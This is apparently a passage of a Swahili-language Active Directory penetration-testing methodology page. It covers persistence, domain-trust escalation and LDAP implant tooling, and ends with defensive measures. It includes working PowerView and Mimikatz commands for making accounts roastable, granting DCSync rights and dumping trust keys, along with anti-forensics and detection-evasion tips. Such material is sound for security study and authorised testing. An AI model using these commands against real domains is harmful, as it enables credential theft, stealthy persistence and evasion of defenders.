### Printer Spooler service abuse

Kupata **Spool service inayoisikiliza** ndani ya domain kunaweza **kutumika vibaya** kupata **credentials mpya** na **kuinua ruhusa**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **watumiaji wengine** wanatumia **kompyuta iliyokompromiwa**, inawezekana **kukusanya credentials kutoka kwenye memory** na hata **kuingiza beacons katika michakato yao** ili kuwafanya impersonate.\
Kawaida watumiaji watafikia mfumo kwa RDP, hivyo hapa kuna jinsi ya kufanya baadhi ya mashambulizi juu ya vikao vya RDP vya wahusika wa tatu:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **nenosiri la Administrator la ndani** kwenye kompyuta zilizojiunga na domain, ukihakikisha linabadilishwa kwa nasibu, ni la kipekee, na hubadilishwa mara kwa mara. Nenosiri hizi zinahifadhiwa katika Active Directory na ufikiaji unadhibitiwa kupitia ACLs kwa watumiaji walioidhinishwa pekee. Ukiwa na ruhusa za kutosha za kupata nenosiri hizi, inawezekana kuzunguka kwenda kwa kompyuta nyingine.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Kukusanya vyeti** kutoka kwa kompyuta iliyokompromiwa inaweza kuwa njia ya kuinua ruhusa ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **vielelezo zilizo dhaifu** zimewekwa, inawezekana kuvitumia vibaya kuinua ruhusa:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Baada ya kuingia (Post-exploitation) kwa akaunti yenye ruhusa za juu

### Kuchoma Credentials za Domain

Mara tu unapopata ruhusa za **Domain Admin** au hata bora zaidi **Enterprise Admin**, unaweza **kuchoma** hifadhidata ya domain: _ntds.dit_.

[**Taarifa zaidi kuhusu shambulizi la DCSync ziko hapa**](dcsync.md).

[**Taarifa zaidi kuhusu jinsi ya kuiba NTDS.dit ziko hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kama Uendelevu

Baadhi ya mbinu zilizojadiliwa hapo juu zinaweza kutumika kwa uendelevu.\
Kwa mfano unaweza:

- Kufanya watumiaji wawe wanyonge kwa [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kufanya watumiaji wawe wanyonge kwa [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Kutoa ruhusa za [**DCSync**](#dcsync) kwa mtumiaji

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Shambulizi la **Silver Ticket** lunda tiketi halali ya Ticket Granting Service (TGS) kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya akaunti ya PC**). Njia hii hutumiwa kupata **ruhusa za huduma**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Shambulizi la **Golden Ticket** linahusisha mwizi kupata **NTLM hash ya akaunti ya krbtgt** katika mazingira ya Active Directory (AD). Akaunti hii ni maalum kwa sababu inatumiwa kusaini yote ya **Ticket Granting Tickets (TGTs)**, ambazo ni muhimu kwa uthibitishaji ndani ya mtandao wa AD.

Mara mwizi anapopata hash hii, anaweza kuunda **TGTs** kwa akaunti yoyote anayoitaka (shambulizi la Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizotengenezwa kwa njia zinazo **kuzuia mbinu za kawaida za kugundua golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na vyeti vya akaunti au uwezo wa kuviomba** ni njia nzuri ya kuendelea kuwa katika akaunti ya mtumiaji (hata kama anabadili nenosiri):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia vyeti pia kunawezekana kwa uendelevu wenye ruhusa za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Kituo cha **AdminSDHolder** katika Active Directory kinahakikisha usalama wa **vikwazo vya wale walio na ruhusa za juu** (kama Domain Admins na Enterprise Admins) kwa kutumia Access Control List (ACL) ya kawaida kwa vikundi hivi ili kuzuia mabadiliko yasiyotakiwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; ikiwa mshambuliaji atabadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo atapata udhibiti mpana juu ya vikundi vyote vya wenye ruhusa. Kipimo hiki cha usalama, kinacholenga kuzuia, kinaweza hivyo kugeuka na kuruhusu ufikiaji usiostahiliwa ikiwa hakifuatiliwi kwa karibu.

[**Taarifa zaidi kuhusu AdminDSHolder Group hapa.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Katikati ya kila **Domain Controller (DC)**, kuna akaunti ya **local administrator**. Kwa kupata haki za admin kwenye mashine kama hiyo, hash ya Administrator wa ndani inaweza kuchomwa kwa kutumia **mimikatz**. Baadaye ni muhimu kufanya mabadiliko kwenye registry ili **kumruhusu kutumia nenosiri hili**, kuwezesha ufikiaji wa mbali kwa akaunti ya Administrator wa ndani.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** mtumiaji baadhi ya **ruhsasa za maalum** juu ya baadhi ya objects za domain ambazo zitamruhusu mtumiaji **kuinua ruhusa baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** zinatumiwa **kuhifadhi** **ruhsasa** ambazo **binafsi** zina juu ya kitu fulani. Ikiwa unaweza kufanya **mabadiliko madogo** kwenye **security descriptor** ya object, unaweza kupata ruhusa za kuvutia juu ya object hiyo bila kuwa mwanachama wa kikundi chenye ruhusa kubwa.

{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia darasa la `dynamicObject` kuunda principals/GPOs/rekodi za DNS za muda mfupi kwa `entryTTL`/`msDS-Entry-Time-To-Die`; zinajifuta zenyewe bila tombstones, zikifuta ushahidi wa LDAP wakati zinabaki na orphan SIDs, marejeleo ya `gPLink` yaliyovunjika, au majibu ya DNS yaliyohifadhiwa (mfano, uchafu wa ACE wa AdminSDHolder au `gPCFileSysPath`/redirects za DNS zinazolingana na AD zenye madhara).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** katika memory ili kuanzisha **nenosiri la ulimwengu wote**, likiruhusu ufikiaji kwa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda SSP yako mwenyewe ili **kukamata** kwa **wazi** credentials zinazotumika kufikia mashine.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Hufanya usajili wa **Domain Controller mpya** katika AD na kuutumia kusukuma sifa (SIDHistory, SPNs...) kwa vitu vilivyoteuliwa **bila** kuacha **logs** kuhusu **mabadiliko**. Unahitaji ruhusa za DA na kuwa ndani ya **root domain**.\
Kumbuka kwamba ikiwa utatumia data sahihi vibaya, logs mbaya zinaweza kuonekana.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Awali tumepitia jinsi ya kuinua ruhusa ikiwa una **ruhusa za kutosha kusoma nenosiri za LAPS**. Hata hivyo, nenosiri hizi pia zinaweza kutumika kwa **kuendeleza uendelevu**.\
Angalia:

{{#ref}}
laps.md
{{#endref}}

## Kuongezeka kwa Ruhusa za Forest - Domain Trusts

Microsoft inaona **Forest** kama mpaka wa usalama. Hii ina maana kwamba **kuharibu domain moja kunaweza kupelekea kuharibiwa kwa Forest nzima**.

### Basic Information

Uaminifu wa [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni mekanisimu ya usalama inayomruhusu mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Kwa kimsingi inaunda muunganisho kati ya mifumo ya uthibitisho ya domain hizo mbili, ikiruhusu uhamisho wa uthibitisho kuendelea kwa urahisi. Wakati domains zinaweka trust, zinabadilishana na kuhifadhi **vifunguo** maalum ndani ya **Domain Controllers (DCs)** zao, ambavyo ni muhimu kwa uadilifu wa uaminifu huo.

Katika senario ya kawaida, ikiwa mtumiaji anataka kufikia huduma katika **domain inayotegemewa**, lazima kwanza aombe tiketi maalum inayojulikana kama **inter-realm TGT** kutoka kwa DC ya domain yake. TGT hii imefichwa kwa **key** iliyoshirikiwa ambayo domains zote mbili zimeridhia. Mtumiaji hutumia TGT hii kwa DC ya **domain inayotegemewa** kupata tiketi ya huduma (**TGS**). Baada ya DC ya domain inayotegemewa kuthibitisha inter-realm TGT kwa kutumia key ya uaminifu na ikitambuliwa, inatoa TGS, ikimruhusu mtumiaji kupata huduma.

**Hatua**:

1. Kompyuta ya **mteja** katika **Domain 1** inaanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** wake.
2. DC1 hutoa TGT mpya ikiwa mteja amethibitishwa kwa mafanikio.
3. Mteja kisha anaomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT imefichwa kwa **trust key** iliyoshirikiwa kati ya DC1 na DC2 kama sehemu ya uaminifu wa domain wa pande mbili.
5. Mteja huchukua inter-realm TGT hadi kwa **Domain 2's Domain Controller (DC2)**.
6. DC2 inathibitisha inter-realm TGT kwa kutumia key ya uaminifu walioshirikiwa na, ikiwa ni halali, hutoa **Ticket Granting Service (TGS)** kwa seva katika Domain 2 ambayo mteja anataka kufikia.
7. Hatimaye, mteja hutumia TGS hii kwa seva, ambayo imefichwa kwa hash ya akaunti ya seva, kupata ufikiaji wa huduma katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **uaminifu unaweza kuwa wa njia 1 au 2**. Katika chaguo la njia 2, domains zote mbili zitatumaini kila mmoja, lakini katika uhusiano wa uaminifu wa **njia 1** moja ya domains itakuwa **trusted** na nyingine itakuwa **trusting**. Katika tukio la mwisho, **utaweza tu kufikia rasilimali ndani ya domain inayotumainiwa kutoka kwa ile inayotegemewa**.

Ikiwa Domain A inamwamini Domain B, A ni domain inayomtumia (trusting) na B ni ile inayotegemewa (trusted). Zaidi ya hayo, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, hii itakuwa **Inbound trust**.

**Aina mbalimbali za uhusiano wa kuaminiana**

- **Parent-Child Trusts**: Hii ni mpangilio wa kawaida ndani ya forest moja, ambapo domain ya mtoto ina moja kwa moja trust ya pande mbili yenye transitive na domain ya mzazi. Kwa kimsingi, hii inamaanisha kwamba maombi ya uthibitisho yanaweza kuhamia kwa urahisi kati ya mzazi na mtoto.
- **Cross-link Trusts**: Zinajulikana kama "shortcut trusts," hizi zinaanzishwa kati ya child domains ili kuharakisha mchakato wa referral. Katika forests tata, referrals za uthibitisho kwa kawaida lazima zionekane hadi kwa mizizi ya forest kisha zishuke hadi domain lengwa. Kwa kuunda cross-links, safari hupunguzwa, jambo ambalo ni la manufaa hasa katika mazingira yaliyoenea kwa maeneo.
- **External Trusts**: Hizi zinaanzishwa kati ya domains tofauti, zisizohusiana na hazina transitivity kwa asili. Kulingana na [nyaraka za Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts zinasaidia kwa kupata rasilimali katika domain nje ya forest ya sasa ambayo haishiriki forest trust. Usalama unaimarishwa kupitia SID filtering kwa external trusts.
- **Tree-root Trusts**: Uaminifu huu unaanzishwa moja kwa moja kati ya domain ya mzizi wa forest na tree root mpya iliyoongezwa. Ingawa haukufikiwa mara kwa mara, tree-root trusts ni muhimu kwa kuongeza miti ya domain mpya kwa forest, kuwapa uwezo wa kutunza jina la kipekee la domain na kuhakikisha transitivity ya pande mbili. Taarifa zaidi inaweza kupatikana katika [mwongozo wa Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni trust ya pande mbili yenye transitivity kati ya mizizi ya forest ya domains mbili, pia ikitekeleza SID filtering ili kuongeza hatua za usalama.
- **MIT Trusts**: Hizi zinaanzishwa na domains za Kerberos zisizo za Windows zinazofuata [RFC4120-compliant](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum zaidi na zinahudumia mazingira yanayohitaji kuingiliana na mifumo ya Kerberos nje ya ekosistimu ya Windows.

#### Tofauti nyingine katika **uhusiano wa kuaminiana**

- Uhusiano wa uaminifu unaweza pia kuwa **transitive** (A inamwamini B, B inamwamini C, basi A inamwamini C) au **non-transitive**.
- Uhusiano wa uaminifu unaweza kuanzishwa kama **bidirectional trust** (pande zote zinamwamini mmojawapo) au kama **one-way trust** (mojawapo tu anamwamini mwingine).

### Njia ya Kushambulia

1. **Orodhesha** uhusiano wa kuaminiana
2. Angalia ikiwa kuna **security principal** (mtumiaji/kikundi/kompyuta) ambaye ana **ufikiaji** wa rasilimali za **domain nyingine**, labda kupitia viingilio vya ACE au kwa kuwa katika makundi ya domain nyingine. Tafuta **uhusiano kati ya domains** (uwekezaji wa trust ulikuwa umeundwa kwa hili pengine).
1. kerberoast katika kesi hii inaweza kuwa chaguo jingine.
3. **Komprometa** **akaunti** ambazo zinaweza **kupitisha** kupitia domains.

Wavamizi wanaoweza kupata rasilimali katika domain nyingine kupitia njia kuu tatu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwenye makundi ya ndani kwenye mashine, kama kikundi cha “Administrators” kwenye server, ikiowapa udhibiti mkubwa wa mashine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa wanachama wa makundi ndani ya domain ya kigeni. Hata hivyo, ufanisi wa njia hii unategemea asili ya trust na wigo wa kikundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa katika **ACL**, hasa kama entiti katika **ACEs** ndani ya **DACL**, wakiwapa ufikiaji wa rasilimali maalum. Kwa wale wanaotaka kuingia zaidi kwenye mbinu za ACLs, DACLs, na ACEs, karatasi nyeupe yenye kichwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni rasilimali ya thamani.

### Pata watumiaji/makundi ya nje wenye ruhusa

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kupata foreign security principals katika domain. Hawa watakuwa watumiaji/makundi kutoka **domain/forest ya nje**.

Unaweza kuangalia hii katika **Bloodhound** au kwa kutumia **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **funguo 2 za kuaminika**, moja kwa _Child --> Parent_ na nyingine kwa _Parent_ --> _Child_.\
> Unaweza kuona ile inayotumika na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Panda cheo kuwa Enterprise admin kwenye child/parent domain kwa kutumia vibaya trust kwa SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Ni muhimu kuelewa jinsi Configuration Naming Context (NC) inaweza kutumiwa vibaya. Configuration NC inatumikia kama hazina kuu ya data za usanidi ndani ya forest katika mazingira ya Active Directory (AD). Data hii huenezwa (replicated) kwa kila Domain Controller (DC) ndani ya forest, ambapo DC zenye uwezo wa kuandika zina nakala inayoweza kuandikwa ya Configuration NC. Ili kuitumia vibaya, lazima uwe na **SYSTEM privileges on a DC**, ukiwa bora child DC.

**Link GPO to root DC site**

Container ya Sites ya Configuration NC inajumuisha taarifa kuhusu site za kompyuta zote zilizounganishwa na domain ndani ya AD forest. Kwa kufanya kazi ukiwa na **SYSTEM privileges on any DC**, wadukuzi wanaweza kuunganisha GPOs kwa root DC sites. Hatua hii inaweza kuhatarisha root domain kwa kubadilisha sera zinazotumika kwa sites hizi.

Kwa taarifa za kina, unaweza kuchunguza utafiti kuhusu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Njia ya shambulio inajumuisha kulenga gMSAs zinazo na hadhi za juu ndani ya domain. KDS Root key, muhimu kwa kuhesabu nywila za gMSAs, imehifadhiwa ndani ya Configuration NC. Ukiwa na **SYSTEM privileges on any DC**, inawezekana kupata KDS Root key na kuhesabu nywila za gMSA yoyote katika forest yote.

Maelezo ya kina na mwongozo hatua kwa hatua yanapatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Shambulio la ziada la delegated MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti wa ziada wa nje: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Mbinu hii inahitaji uvumilivu, kusubiri uundaji wa vitu vipya vya AD vya hadhi ya juu. Ukiwa na **SYSTEM privileges**, mdhumuzi anaweza kubadilisha AD Schema ili kumpa mtumiaji yeyote udhibiti kamili juu ya madaraja yote. Hii inaweza kusababisha upatikanaji usioidhinishwa na udhibiti wa vitu vipya vya AD vinavyoundwa.

Maelezo zaidi yanapatikana kwenye [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Udhuru wa ADCS ESC5 unalenga kupata udhibiti wa vitu vya Public Key Infrastructure (PKI) ili kuunda template ya cheti itakayotumika kuthibitisha kama mtumiaji yeyote ndani ya forest. Kwa kuwa vitu vya PKI viko katika Configuration NC, kuibiwa kwa writable child DC kunaruhusu utekelezaji wa mashambulizi ya ESC5.

Maelezo zaidi yanaweza kusomwa katika [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Katika mazingira bila ADCS, mdhumuzi ana uwezo wa kuweka vipengele vinavyohitajika, kama ilivyojadiliwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika senario hii **domain yako imeaminika** na domain ya nje ikikupa **ruhusa zisizojulikana** juu yake. Utatakiwa kubaini **ni principals gani za domain yako zina ruhusa gani juu ya domain ya nje** na kisha kujaribu kuiexploit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain ya Msitu wa Nje - Njia Moja (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika senario hii **domain yako** inamwamini baadhi ya **privileges** kwa mhusika kutoka **domains tofauti**.

Hata hivyo, wakati **domain imeaminika** na domain inayomwamini, domain iliyothibitishwa **inaunda user** mwenye **jina linaloweza kutabiriwa** ambaye anatumia kama **password trusted**. Hii ina maana kuwa inawezekana **kupata access kwa user kutoka domain inayomwamini ili kuingia kwenye domain iliyothibitishwa** kuifanyia enumeration na kujaribu kuinua privileges zaidi:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuathiri domain iliyothibitishwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa katika **mwelekeo wa kinyume** wa domain trust (ambayo si ya kawaida sana).

Njia nyingine ya kuathiri domain iliyothibitishwa ni kusubiri kwenye mashine ambapo **user kutoka domain iliyothibitishwa anaweza kufikia** kuingia kwa kupitia **RDP**. Kisha, mshambuliaji anaweza kuingiza code katika mchakato wa RDP session na **kupata access kwenye origin domain ya mwathirika** kutoka hapo.  
Zaidi ya hayo, ikiwa **mwathirika ame-mount hard drive yake**, kutoka kwenye mchakato wa **RDP session** mshambuliaji anaweza kuweka **backdoors** katika **startup folder ya hard drive**. Mbinu hii inaitwa **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupunguza matumizi mabaya ya domain trust

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia SID history attribute kuvuka inter-forest trusts inapunguzwa na SID Filtering, ambayo imewezeshwa kwa default kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni salama, ikichukulia forest, badala ya domain, kama mpaka wa usalama kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna tatizo: SID filtering inaweza kuvuruga applications na access za watumiaji, na kusababisha kuzimwa kwake mara kwa mara.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication huhakikisha kwamba watumiaji kutoka forest mbili hawa-authenticate moja kwa moja. Badala yake, inahitajika ruhusa maalum ili watumiaji waweze kufikia domains na servers ndani ya domain au forest inayomwamini.
- Ni muhimu kutambua kuwa hatua hizi hazilindi dhidi ya matumizi mabaya ya writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Kutumiwa kwa LDAP kwa AD kutoka On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) huwasaidia waendeshaji kuweka principals au machine accounts wapya mahali popote haki za OU zipo. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` zinaweza kuiba moja kwa moja malengo mara tu haki za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye kitu chochote cha AD kuwa password resets, udhibiti wa uanachama wa group, au DCSync replication privileges bila kuacha PowerShell/ADSI artifacts. Mifano ya `remove-*` hurudisha ACE zilizowekwa.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` huruhusu mara moja user aliyededewa kuwa Kerberoastable; `add-asreproastable` (UAC toggle) humweka kwa AS-REP roasting bila kugusa password.
- Macros za delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) hurudia `msDS-AllowedToDelegateTo`, UAC flags, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwa beacon, zikiruhusu constrained/unconstrained/RBCD attack paths na kuondoa hitaji la PowerShell ya mbali au RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inaongeza SIDs zenye hadhi kwenye sid history ya principal inayodhibitiwa (tazama [SID-History Injection](sid-history-injection.md)), ikitoa urithi wa ufikiaji kwa njia ya kimwiba kabisa kwa LDAP/LDAPS.
- `move-object` hubadilisha DN/OU ya computers au users, ikiruhusu mshambuliaji kuvuta mali ndani ya OUs ambapo haki zilizotumwa tayari zipo kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`.
- Amri za kuondoa zilizo na mipaka (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) zinaruhusu kuondolewa kwa haraka baada ya operator kuvuna credentials au persistence, kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Inashauriwa kwamba Domain Admins waruhusiwe kuingia tu kwenye Domain Controllers, wakiepuka matumizi yao kwenye hosts nyingine.
- **Service Account Privileges**: Huduma hazipaswi kuendeshwa zikiwa na vibali vya Domain Admin (DA) ili kudumisha usalama.
- **Temporal Privilege Limitation**: Kwa kazi zinazohitaji DA privileges, muda wake unapaswa kudhibitiwa. Hii inaweza kufikiwa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 kisha utekeleze LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzima jaribio la LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Kutumia deception kunajumuisha kuweka mtego, kama watumiaji au kompyuta za udanganyifu, zenye sifa kama passwords zisizokoma au zilizo alama kama Trusted for Delegation. Jinsi ya kina inajumuisha kuunda watumiaji wenye haki maalum au kuwaongeza kwenye makundi yenye mamlaka ya juu.
- Mfano wa vitendo ni kutumia zana kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Zaidi kuhusu kueneza mbinu za deception ziko kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Viashiria vinavyoshangaza ni ObjectSID isiyokuwa ya kawaida, logons zisizo mara kwa mara, tarehe za uundaji, na idadi ndogo ya bad password counts.
- **General Indicators**: Kupima sifa za vitu vinavyoweza kuwa decoy dhidi ya vitu halisi kunaweza kufichua kutofanana. Zana kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua udanganyifu huo.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia utambuzi wa ATA.
- **Ticket Impersonation**: Kutumia **aes** keys kwa uundaji wa ticket kunasaidia kuepuka utambuzi kwa kutoangusha to NTLM.
- **DCSync Attacks**: Inashauriwa kutekeleza kutoka kwenye non-Domain Controller ili kuepuka utambuzi wa ATA, kwani utekelezaji wa moja kwa moja kutoka Domain Controller utaleta alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
